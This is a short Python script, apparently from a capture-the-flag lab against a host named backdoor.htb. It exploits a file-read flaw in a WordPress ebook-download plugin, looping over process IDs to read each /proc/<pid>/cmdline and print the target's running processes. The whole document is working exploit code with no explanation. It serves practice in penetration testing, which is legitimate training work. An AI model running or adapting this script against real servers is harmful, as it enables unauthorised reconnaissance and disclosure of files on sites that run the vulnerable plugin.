import requests
for i in range(1, 10000):
  r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
  out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()</script>','').replace('\00',' '))
  if len(out)>1:
    print("PID"+str(i)+" : "+out)
